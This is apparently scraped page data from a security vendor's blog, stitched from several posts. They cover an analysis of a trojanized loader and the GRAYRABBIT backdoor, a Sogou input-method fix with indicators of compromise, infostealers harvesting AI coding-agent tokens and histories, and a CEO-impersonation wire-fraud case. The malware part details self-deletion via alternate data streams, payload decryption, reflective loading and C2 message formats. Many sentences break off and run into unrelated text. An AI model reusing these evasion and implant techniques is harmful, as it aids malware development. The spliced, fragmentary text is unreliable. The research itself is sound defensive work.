https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/img14.png.webp?itok=Up3_DpON 2x","media":"(min-width: 420px)","type":"image/webp","width":602,"height":386}],"caption":"Figure 14. This helps it avoid behavioral detection rules targeting common thread creation patterns.\u003c/p\u003e\n\u003cp\u003eBefore executing the payload, the loader self-deletes using an NTFS Alternate Data Stream technique. It opens its own file with DELETE access (0x10000) and FILE_SHARE_READ, then calls SetFileInformationByHandle with the FileRenameInfo class (3) to rename the default data stream to a randomly named ADS (for example, :aB3xRt). Next, it sets FileDispositionInfo (class 4) with DeleteFile = TRUE, closes the handle, reopens the file, and sets the disposition again. When all handles close, the file disappears from disk. No DeleteFileW call ever appears in behavioral logs.\u003c/p\u003e\n\u003ch2\u003eThe Payload: GRAYRABBIT Backdoor\u003c/h2\u003e\n\u003cp\u003eThe encrypted payload blob is structured as a two-stage package: a position-independent shellcode stub (0xC7 bytes) followed by the XOR-encrypted GRAYRABBIT PE. This packaging format, a short decryptor stub prepended to a single-byte XOR-encrypted PE that calls the CoreClientInstall export, is the standard GRAYRABBIT delivery format that Google Threat Intelligence has documented consistently across every UNC3569 campaign since at least 2021.\u003c/p\u003e\n\u003cp\u003eThe stub uses a call/pop technique to locate its own base address, adds 0xBF to find the start of the encrypted data (which lands at file offset 0xC7), and then XOR-decrypts the entire embedded PE (0x42800 bytes) with the single-byte key 0x33. After decryption, the stub navigates the PE's export directory using an RVA-to-file-offset converter (since the PE has not been mapped into virtual memory yet), locates CoreClientInstall as the first export by ordinal, and calls it with the decrypted PE base address as the argument.\u003c/p\u003e\n\u003cp\u003eThe decrypted PE is an x64 variant of GRAYRABBIT, a lightweight C++ backdoor that UNC3569 has used repeatedly over the years as a first-stage implant. The internal module name is core.dll, and the backdoor exports two functions: CoreClientInstall (the reflective loader entry point) and CoreClientStart (the main RAT loop). These export names, together with the C2 protocol structure and beacon format, are the defining identifiers for GRAYRABBIT, as documented by Google Threat Intelligence in the VB2024 paper mentioned above. The x64 variant represents a maturation of the original x86 GRAYRABBIT, with structural differences including a byte-operation-encoded C2 domain and an expanded command set.\u003c/p\u003e\n\u003cp\u003eCoreClientInstall is a reflective PE loader. It resolves VirtualAlloc from kernel32 (via the same PEB-walk hash technique), allocates RWX memory large enough for the full PE image, and maps the PE into it: copying sections to their virtual addresses, processing base relocations, and resolving imports through ntdll's LdrGetDllHandle and LdrGetProcedureAddress (also resolved by hash). A NormalMsg frame contains a 12-byte header: the 4-byte magic, a 4-byte payload length, and a 4-byte command ID, followed by up to 4084 bytes of UTF-8 payload data. A FileMsg frame has a larger 264-byte (0x108) header: the 4-byte magic, a 4-byte payload length, a 1-byte operation code ('s' for start, 'c' for chunk, 'e' for end), and a 255-byte null-terminated file path, followed by up to 3832 bytes of file data. The operation codes control the file transfer state machine: 's' creates a new transfer entry in an internal task queue and delivers the first data chunk, 'c' appends subsequent chunks, and 'e' marks the transfer as complete (status 2), signaling any waiting thread that the full file is available.\u003c/p\u003e\n\u003cp\u003eAll numbered commands (0 through 9) and the default plugin dispatch are delivered as NormalMsg frames. handlers\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eCommand 5 is the plugin loader, and its behavior depends on whether the requested module has already been downloaded. The payload contains a file path string (UTF-8). When the command arrives, the handler first looks up this path in an internal task queue that tracks all ongoing and completed file transfers. Two outcomes are possible:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eIf the path is NOT found in the task queue (the module has not been downloaded yet), the handler spawns a dedicated download thread. This thread sends a NormalMsg with command ID 8 back to the C2, carrying the same file path as its payload, effectively requesting the C2 to deliver the file. The C2 responds with a sequence of FileMsg frames: an 's' frame to create the transfer entry and deliver the first chunk, zero or more 'c' frames with subsequent chunks, and a final 'e' frame that marks the transfer as complete (setting an internal status field to 2). The download thread polls the task queue in a loop, sleeping approximately two seconds between checks, until it detects that the entry's status has reached 2. At that point, it proceeds to the reflective loading stage.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIf the path IS found with status 2 (the module was already downloaded in a previous command), the handler skips the download entirely and proceeds directly to reflective loading.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe reflective loading stage maps the downloaded PE into memory using the same infrastructure as CoreClientInstall: it resolves VirtualAlloc from kernel32 via PEB-walk hashing, allocates executable memory, maps sections to their virtual addresses, processes relocations, resolves imports, and calls the entry point with DLL_PROCESS_ATTACH. A designated export is then resolved by hash and invoked. Each loaded module is tracked in a linked list, and unrecognized command IDs (the default case in the dispatch table) are forwarded to these modules via vtable calls, allowing the C2 operator to extend GRAYRABBIT's capabilities at runtime without replacing the core implant.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/img17.png.webp?itok=NkVhVS4v 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/img17.png.webp?itok=r-7l4zrt 2x","media":"(min-width: 1020px)","type":"image/webp","width":671,"height":616},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/img17.png.webp?itok=qEaaEmyE 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/img17.png.webp?itok=SeAQlQlM 2x","media":"(min-width: 720px)","type":"image/webp","width":671,"height":616},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/img17.png.webp?itok=DEJ5bU9v 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/img17.png.webp?itok=dsIGK0m- 2x","media":"(min-width: 420px)","type":"image/webp","width":671,"height":616}],"caption":"Figure 17. In their response, Tencent characterized the vulnerability's impact as limited, noting that the exploitation chain is \"relatively complex\" and that it requires \"social engineering tactics to induce the user to actively authorize the browser's pop-up prompt.\" Their response also called on \"all platform providers to further strengthen the identification and interception of illicit links\". While the update blocks the exploit path we observed, the underlying browser component remains outdated, continues to run without sandboxing, and still has important browser security controls disabled. We believe these components warrant further hardening.\u003c/p\u003e\n\u003cp\u003eWe recommend that all Sogou Input Method users update to the latest version as soon as possible.\u003c/p\u003e\n\u003ch2\u003eWhat was Fixed\u003c/h2\u003e\n\u003cp\u003eThe entire fix lives in biz_helper.exe, at the protocol handler level. The handler now identifies URL-bearing switches by checking the switch name against a set of known URL parameters (specifically -url and -firsturl, the two switches that SGMyInput.exe uses to accept custom navigation URLs). For each URL found, it calls InternetCrackUrlW to parse the URL structure, immediately rejects anything that is not HTTPS (blocking http://, ftp://, data://, javascript://, and every other scheme), extracts the hostname, lowercases it, and checks it against a suffix-matching allowlist containing four entries: sogou.com, qq.com, woa.com, sogou.\u003c/p\u003e\n\u003cp\u003eThe suffix matching means sogou.com matches anything.sogou.com, skins.sogou.com, and so on, but does not match attacker-sogou.com (the comparison is performed right-to-left against \".sogou.com\" with a dot prepended to each allowlist entry).\u003c/p\u003e\n\u003cp\u003eNotably, the CEF configuration and the version of libcef itself were not changed. In the patched SGWebRender.exe and SGMiniBrowserHelperHost DLL, CefSettings.no_sandbox is still set to 1, the bDisableWebSecurity flag is still hardcoded to 1, and the ConfigureCefCommandLineSwitches callback still appends disable-web-security, allow-file-access-from-files, and the other insecure flags. The embedded browser component remains sandboxless and security-stripped. It just can no longer be reached through the external protocol handler with an attacker-controlled URL, because the input validation in biz_helper.exe now blocks this attack at the front door.\u003c/p\u003e\n\u003cp\u003eAt the time of writing this, additional checks were added to biz_helper, such as browser-context module argument whitelist and a dangerous param argument blocklist. However, CEF configuration and version still remain unchanged.\u003c/p\u003e\n\u003ch2\u003eIndicators of Compromise\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eFile hashes (SHA256)\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e29c7ee41d0cc9e07d981e451df56d0c3d37c41ac4ec10c7b516cc033ee397a63 - 7zp.dll (trojanized DLL loader, internal name: boy.dll)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e749160a2f20f82744026719cf72e483595c6aad718efa74d675a98662e02422e - p (encrypted PE loader shellcode)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eD7a3c7eb94edc0e020f74c678743d71d61e944634aade4a67a96c3589e828b3a - GRAYRABBIT backdoor (internal name: core.dll)\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eNetwork indicators\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003email.uaiubifas[.]top - GRAYRABBIT C2 domain (port 443, raw TCP, RC4-encrypted)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003enoht1ng[.]top - Exploit page hosting domain\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e8.218.50[.]207 - Staging server (Alibaba Cloud, Hong Kong)\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e"}],"itemState":"published","timeToRead":"26","translations":[],"originalLanguagePost":{},"mediaType":{"video":false,"audio":false},"socialMediaMetaImage":"https://www.gendigital.com/blog/sites/default/files/styles/social_media_meta/public/2026-09/img_cover_0.jpg?h=10cbc464\u0026itok=QhonXfT2","relatedPosts":[{"urlAlias":"/blog-post/free-ai-at-the-price-of-your-prompt","title":"Free AI, at the Price of Your Prompt","subtitle":"You choose a model, ask a question and get an answer. class=\"text-align-justify\"\u003eOur analysis of recent information-stealer collection rules found a much newer category alongside the familiar browser, wallet, and credential targets: local data associated with Claude, Cline, Codex, Continue, Cursor, OpenCode, and other AI-assisted development tools.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eThis was not an isolated experiment: over a three-month period, our Windows telemetry recorded Amatera and Remus detections among tens of thousands of protected users. \u003ca href=\"https://www.gendigital.com/blog/insights/research/wordlistloader-delivering-amatera-via-clearfake-campaigns\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eAmatera\u003c/a\u003e targets data associated with Cline and Continue, while \u003ca href=\"https://www.gendigital.com/blog/insights/research/remus-64bit-variant-of-lumma-stealer\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eRemus\u003c/a\u003e targets Claude, Cursor, and OpenCode. The figures may overlap and describe detections rather than successful infections, but they show that AI agent data has already entered the information-stealer economy.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eWhat the malware is collecting goes far beyond harmless preferences. Depending on the agent and its configuration, local files may contain access and refresh tokens, credentials stored in MCP configurations, prompt histories, conversation databases, account details, and traces of the projects a developer has been working on. In one archive, an attacker may obtain both the means to access an account and the context needed to understand what is valuable behind it.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eOur findings focus primarily on locally installed coding agents and agentic developer tools, and they do not point to a new way of compromising the device or to a vulnerability in an AI model or agent. The information stealer is already running; what has changed is the concentration of valuable information in predictable locations, sometimes in plaintext, and the ease with which those locations can be added to an existing collection list.\u0026nbsp;\u003c/p\u003e\u003ch2 class=\"text-align-justify\"\u003eThe collection rules have already changed\u0026nbsp;\u003c/h2\u003e\u003cp class=\"text-align-justify\"\u003eCallbackBeaver, a fast-emerging stealer, has added Cursor and Claude to its collection scope, and we observed more than 5,000 samples during a recent 30-day period. Lower-prevalence families, including BeeStealer, STG Stealer, HydraStealer, APEX Stealer, and Otter Stealer, show that the behavior is spreading beyond one or two larger operations The pace of adoption is striking, with AI agent data appearing in the collection rules of another stealer almost every day.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eThe same behavior is visible across operating systems, with Djinn Stealer on macOS associated with collecting data from Claude, Codex, Gemini, Cline, OpenCode, and Kilo.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eThe reconstructed rules below show how directly several AI-assisted development tools have been added to a stealer's collection scope. The list is a snapshot rather than a complete map of the ecosystem, but it makes the change visible: agent data is now sitting alongside the targets that information stealers have pursued for years.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/StealerAIPaths.png.webp?itok=zRPK5IU8 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/StealerAIPaths.png.webp?itok=VdQRY6i8 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":780},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/StealerAIPaths.png.webp?itok=n3HBOPlU 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/StealerAIPaths.png.webp?itok=kOvn5k3Q 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":593},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/StealerAIPaths.png.webp?itok=5PLJoD4e 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/StealerAIPaths.png.webp?itok=rCax5p4M 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":460}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/StealerAIPaths.png.webp?itok=5PLJoD4e","link":""}]},{"bundle":"rich_text","content":"\u003cp class=\"text-align-justify\"\u003eThe targeting of AI agent data is emerging within a much larger infostealer problem. During the first half of 2026, our telemetry recorded infostealer detections among more than 3.3 million unique protected users, with the monthly number consistently exceeding 500,000. These figures cover all infostealer families, not only those known to target AI agent data, but they show the scale of the ecosystem in which this behavior is spreading.\u0026nbsp;\u003c/p\u003e\u003ch2 class=\"text-align-justify\"\u003eAccess and context in the same archive\u0026nbsp;\u003c/h2\u003e\u003cp class=\"text-align-justify\"\u003eAn agent's local directory contains far more than interface preferences. The exact files, paths, and protections differ between products, operating systems, and user settings, but the material we found falls into two broad categories: access to accounts and connected services, and context that can compromise a user’s privacy by revealing who they are and what they are working on.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eSome agents cache access tokens or other login details locally so that the user does not have to authenticate for every session. An access token may let an attacker use the account until it expires, while a refresh token can sometimes be exchanged for new access tokens and extend the window of abuse. Stolen tokens can be used to consume paid API capacity, while working access to an account may be packaged and resold so that someone else can use a commercial AI service at the victim’s expense. The outcome depends on the token's scope, lifetime, and the service's own controls, so stealing a file does not guarantee lasting access, but the file can still be as sensitive as a password store.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eThe \u003ca href=\"https://modelcontextprotocol.io/docs/2026-07-28/getting-started/intro\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eModel Context Protocol\u003c/a\u003e, commonly known as MCP, can extend that access beyond the AI service. It allows an agent to connect to external tools and data sources, and local configurations may include endpoints, headers, environment variables, API keys, or other authentication details. A stolen configuration does not automatically unlock every connected service, because some integrations use short-lived credentials, OS-protected storage, or an interactive authorization flow. Where reusable secrets are stored locally, however, the compromise may reach source control, ticketing platforms, databases, cloud services, or collaboration tools connected to the agent, potentially broadening the attack surface.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eThe context can be just as valuable, because developers use AI assistants to review code, interpret logs, troubleshoot incidents, summarize internal documentation, and reason through unfinished work. Their prompts and transcripts can contain proprietary source code, repository names, internal hostnames and API keys or other secrets pasted into a conversation. If an employee has used the assistant while developing a confidential proof of concept, the stolen history could expose an unpatented invention or another trade secret, with consequences far beyond the theft of an AI account. A transcript may also provide reconnaissance that an attacker would otherwise spend days collecting, including the structure of a codebase, known technical problems, security tooling, and the people involved in a project.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eLocal data may also expose an email address, account or organization identifiers, display name, subscription type, billing status, seat tier, rate limits, user preferences, and a history of recent files or projects. None of these fields is as dramatic as a token, but together they can undermine the user’s privacy by building a detailed picture of who they are and what they do. Combined with personal information stolen elsewhere from the device, they may also contribute to identity theft, while helping criminals identify valuable victims and make targeted/spear phishing or extortion attempts more convincing.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eThe danger lies in combining access with context: a browser cookie can open a door, but an AI-agent archive may also tell the attacker whose door it is, which projects are behind it, and which connected systems may be reachable from the same workspace. Incident responders should therefore treat agent credentials and local histories as part of the broader identity and access surface, not as an isolated AI account.\u0026nbsp;\u003c/p\u003e\u003ch2 class=\"text-align-justify\"\u003eAdding the next agent may take one configuration update\u0026nbsp;\u003c/h2\u003e\u003cp class=\"text-align-justify\"\u003eMany information stealers already receive remotely managed collection rules specifying directories, filenames, extensions, databases, search depth, or file-size limits. Once an operator learns where an agent stores useful data, expanding that list can be as simple as adding another path.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eThe malware may not need to be rebuilt or redistributed. An updated rule can be delivered to existing installations, allowing the operator to start collecting a newly popular agent's files across already compromised devices. This does not apply to every stealer, and some tools need product-specific parsing or decryption, but the basic barrier to entry is low when the target is a predictable local file.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eIf a major stealer does not collect a particular agent today, its absence from the list should be treated only as a snapshot, not as evidence that the agent will remain outside the collection scope once criminals see enough users, valuable accounts, or resale demand.\u0026nbsp;\u003c/p\u003e\u003ch2 class=\"text-align-justify\"\u003eWhat users and security teams should do\u0026nbsp;\u003c/h2\u003e\u003cp class=\"text-align-justify\"\u003eAI-agent data should be included in the same security conversations as browser profiles, developer credentials, password stores, and cloud command-line tools. The response needs to cover both prevention and the actions taken after a suspected stealer infection.\u0026nbsp;\u003c/p\u003e\u003cul type=\"disc\"\u003e\u003cli data-list-item-id=\"e9c8f62b192dd7be1ca6328df6679dcb8\"\u003eKnow what is stored locally. Inventory the agents in use, review their retention and history settings, and understand where they keep credentials, conversations, project records, and MCP configuration.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"eb7c4958e803b3c580e162cae0d899d6a\"\u003ePrefer protected credential storage. Where a product offers a choice, use the \u003ca href=\"https://developers.openai.com/codex/auth\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eoperating system's credential store, keychain, or keyring\u003c/a\u003e rather than file-based token storage. A local authentication file containing access tokens should be treated like a password.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ed3c578310cc33e114c3aea0bc5f495fe\"\u003eKeep secrets out of prompts and histories. Avoid pasting passwords, private keys, API secrets, or customer data into a conversation. If a secret has been exposed for troubleshooting, rotate it and remove the retained conversation where possible.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"e1288f8a1a4ebbb51184460556d34c0db\"\u003eLimit what connected tools can do. Give MCP integrations only the permissions they need, favor short-lived and narrowly scoped tokens, and separate personal, development, and production access. Review old servers and revoke connections that are no longer used.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ea4fc9c9016c9026dbf5d7ada8eee07f6\"\u003eProtect the endpoint. Keep the operating system and applications updated, use reputable endpoint protection, and be particularly cautious with ClickFix/FakeCaptcha instructions, cracked software, unofficial installers, and other common routes used to deliver information stealers.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ea8ebc0cc54527b97295b8e4240320f3c\"\u003eExpand incident response. After a stealer infection, changing browser passwords alone is no longer enough. From a clean device, revoke AI-service sessions, rotate API keys and other credentials used by MCP connections, review connected applications and account activity, and assess whether local prompts or transcripts exposed company information. Multi-factor authentication remains important, but it may not stop abuse of a session token that has already been stolen.\u0026nbsp;\u003c/li\u003e\u003c/ul\u003e\u003ch2 class=\"text-align-justify\"\u003eSafer defaults have to come from the products too\u003c/h2\u003e\u003cp class=\"text-align-justify\"\u003eUsers cannot carry this responsibility alone, so agent developers should minimize the amount of sensitive information kept locally, separate authentication material from ordinary history, use OS-protected credential storage wherever possible, and make retention controls easy to find and understand. Tokens should be short-lived, scoped to the smallest practical set of permissions, and simple to revoke. MCP connections need equally clear visibility, so users and administrators can see what is connected, what it can access, and when it was last used.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eEncryption at rest can help, but it should not become a reassuring label without a threat model behind it. If the decryption key is stored beside the database, or the application automatically unlocks everything for any process running as the user, an information stealer may still obtain the data. Reducing what is retained and limiting the value and lifetime of credentials are just as important as encrypting the file.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eAI agents are becoming a new layer of working memory on our devices, storing not only what we ask them, but also who we are, what we are building, and which services we have allowed them to reach. Information stealers have already adjusted their collection rules to reflect that value, and because another agent can sometimes be added with a simple configuration update, the target list will continue to change as adoption grows.\u0026nbsp;\u003c/p\u003e\u003cp class=\"text-align-justify\"\u003eOnce an AI agent holds credentials, conversation history, and a map of the user’s work, its local files are no longer merely configuration. They have become another high-value data store on the device, and attackers are already treating them that way.\u0026nbsp;\u003c/p\u003e"}],"itemState":"published","timeToRead":"10","translations":[],"originalLanguagePost":{},"mediaType":{"video":false,"audio":false},"socialMediaMetaImage":"https://www.gendigital.com/blog/sites/default/files/styles/social_media_meta/public/2026-09/HeroAgentStealer2.jpg?h=745bb08b\u0026itok=rGtDkiU2","relatedPosts":[{"urlAlias":"/blog-post/free-ai-at-the-price-of-your-prompt","title":"Free AI, at the Price of Your Prompt","subtitle":"You choose a model, ask a question and get an answer. started with an innocent WhatsApp message.\u003c/p\u003e\u003cp\u003e\u003cem\u003e“Hi David, I hope you are well. Are you at the office?”\u003c/em\u003e\u003c/p\u003e\u003cp\u003eThe sender claimed to be a real Gen executive based in Dublin. The profile used his name, photograph and an Irish telephone number. Nothing in the opening message mentioned money, urgency or an acquisition. It was simply designed to establish whether the recipient was available and willing to respond.\u003c/p\u003e\u003cp\u003eThe recipient, whom we will call David, worked in Gen’s legal team and knew the colleague being impersonated. The unfamiliar telephone number raised suspicion, and the first phone conversation confirmed it: the caller’s voice did not match.\u003c/p\u003e\u003cp\u003eDavid knew he was dealing with a scam. Every subsequent message, call and document formed part of a controlled effort to understand how the operation worked and gather evidence about the people behind it.\u003c/p\u003e\u003cp\u003eWhat followed involved a second impersonated identity, forged legal documents, a fictitious confidential acquisition and a request to transfer €626,735.45 to a company in Hong Kong.\u003c/p\u003e\u003cp\u003eWhat began as an attack against Gen’s legal team soon revealed a wider pattern. Our researchers found four additional targeted individuals who had received closely related NDA documents. The companies, advisers and acquisition narratives changed, but the structure, communication rules and document fingerprints remained remarkably consistent.\u003c/p\u003e\u003cp\u003eWe call the campaign \u003cstrong\u003ePhantom Deal\u003c/strong\u003e.\u003c/p\u003e\u003ch2\u003eA real person, but neither his number nor his voice\u003c/h2\u003e\u003cp\u003eThe first persona claimed to be someone from inside the company. The attacker had selected an identity that made sense in the context of Gen’s international operations and used a phone number with the correct country code to reinforce the illusion.\u003c/p\u003e\u003cp\u003eThe deception did not survive the first call. David knew the person being impersonated, and the voice on the other end was not his.\u003c/p\u003e\u003cp\u003eAfter the initial exchange, a second person entered the conversation. This time, the attacker impersonated a genuine professional associated with PwC and asked the target to provide a private email address.\u003c/p\u003e\u003cp\u003eThat request was not incidental.\u003c/p\u003e\u003cp\u003eThe forged NDA that followed instructed the recipient to keep all communication related to the acquisition on WhatsApp and personal email. The attackers tried to keep the entire exchange outside corporate communication channels before introducing any payment request.\u003c/p\u003e\u003cp\u003eThe attackers had also studied Gen’s history. The acquisition narrative referenced Avast Software and NortonLifeLock Ireland Limited, drawing on the real acquisition of Avast by NortonLifeLock in 2022 and the subsequent creation of Gen Digital. The names were familiar, the corporate relationship had existed, and an intercompany transaction could appear plausible to someone operating under pressure and secrecy.\u003c/p\u003e\u003cp\u003eThis was not a generic message sent to thousands of employees. The story had been adapted to its target. The targeting was tailored, but the execution was not flawless. David quickly identified inconsistencies in the explanation for why Avast should make a payment on behalf of NortonLifeLock Ireland Limited. His legal background and familiarity with internal transaction processes made those gaps easier to spot. A more coherent payment narrative could have made the same playbook considerably more convincing.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/1.png.webp?itok=5vk23yHy 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/1.png.webp?itok=E5i4m7y6 2x","media":"(min-width: 1020px)","type":"image/webp","width":1024,"height":768},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/1.png.webp?itok=B-ETEbcS 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/1.png.webp?itok=1rKuJ4ot 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":668},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/1.png.webp?itok=VKH-EFVv 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/1.png.webp?itok=pkad8wX1 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":518}],"caption":"Figure 1. It established the rules under which the victim was expected to operate.\u003c/p\u003e\u003cp\u003eThe document introduced a confidential acquisition, imposed a strict disclosure regime and set a near-term date for the supposed public announcement. Most importantly, it required communication to take place through WhatsApp and personal email.\u003c/p\u003e\u003cp\u003eUnder normal circumstances, instructions to avoid company systems and exclude colleagues from a major transaction would be obvious warning signs. Inside the fiction created by the NDA, the same behaviour could be presented as a legal obligation.\u003c/p\u003e\u003cp\u003eThe attackers were attempting to turn the company’s own confidentiality culture against it.\u003c/p\u003e\u003cp\u003eThe target was encouraged not to involve colleagues, not to discuss the transaction through normal channels and not to verify the instructions with Legal, Finance, Treasury, Compliance or Corporate Development. A recipient who treated the NDA as genuine would become increasingly isolated from the colleagues most likely to challenge the story.\u003c/p\u003e\u003cp\u003eThe NDA was not an accessory to the attack. The NDA had been presented only days earlier.\u003c/p\u003e\u003cp\u003eThat short window created pressure while providing a ready-made explanation for why the operation could not be discussed more broadly.\u003c/p\u003e\u003cp\u003eThe supposed adviser then sent payment instructions asking Avast Software s.r.o. to transfer money on behalf of NortonLifeLock Ireland Limited.\u003c/p\u003e\u003cp\u003eThe amount was precise: €626,735.45.\u003c/p\u003e\u003cp\u003eThe beneficiary was a company in Hong Kong, with the payment described as an “Advance Retainer for Professional Services.” The document stated that the amount would be recorded as an intercompany receivable and reimbursed when the acquisition was formally announced.\u003c/p\u003e\u003cp\u003eIt was a classic advance-payment fraud wrapped in the language of M\u0026amp;A, legal privilege and internal corporate accounting.\u003c/p\u003e\u003ch2\u003e“I need a SWIFT MT103”\u003c/h2\u003e\u003cp\u003eOnce the payment instructions had been delivered, the tone changed.\u003c/p\u003e\u003cp\u003eThe attacker began following up for confirmation that the transfer had been completed. The target was asked to provide a SWIFT MT103, the banking message used as evidence that an international transfer has been executed.\u003c/p\u003e\u003cp\u003e\u003cem\u003e“I need a swift MT103, it’s an official proof of wire transfer to attached to the package.”\u003c/em\u003e\u003c/p\u003e\u003cp\u003eLater, after receiving what appeared to be a confirmation email, the attacker complained that the link would not open and asked for the document as a PDF. He then added another requirement: the confirmation should contain the UETR number, a unique reference used to track a payment through the SWIFT network.\u003c/p\u003e\u003cp\u003eThe request for the MT103 and UETR confirmed the objective. The attackers wanted proof that the funds were moving and the information needed to monitor the transfer, potentially reducing the time available for the company or its bank to intervene.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/2.png.webp?itok=c4RbyyJP 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/2.png.webp?itok=1rS-PiCd 2x","media":"(min-width: 1020px)","type":"image/webp","width":1024,"height":768},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/2.png.webp?itok=fxqzK_Yk 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/2.png.webp?itok=Z39SAK87 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":668},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/2.png.webp?itok=rSDP9_LT 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/2.png.webp?itok=sTeefbaj 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":518}],"caption":"Figure 3. Working with our researchers, he continued the exchange while the team controlled the material being sent and monitored how the operation responded.\u003c/p\u003e\u003cp\u003eA fake account statement was prepared, showing what appeared to be the requested payment and the remaining company balance. The document contained a hidden marker that could identify whether it was opened on a system protected by one of our products.\u003c/p\u003e\u003cp\u003eWhen the attackers requested formal MT103 confirmation, the team also created a fake Citibank-style confirmation email. It contained the transaction amount, beneficiary and payment reference expected by the criminals, together with a link to view the full transaction details.\u003c/p\u003e\u003cp\u003eThe link did not lead to real banking information. It contained a canary token, allowing our researchers to record when it was opened.\u003c/p\u003e\u003cp\u003eWhen he reported that the link was not working, the team suggested that his VPN might be causing the problem and asked him to disable it. Further access attempts followed within minutes.\u003c/p\u003e\u003cp\u003eThe token recorded 49 HTTP requests from 43 IP addresses over 24 days. Most of the activity in the first minutes came from automated scanners, cloud services and redirect-analysis systems, so the raw count does not represent 49 actions by the attacker.\u003c/p\u003e\u003cp\u003eAfter filtering that noise, the remaining 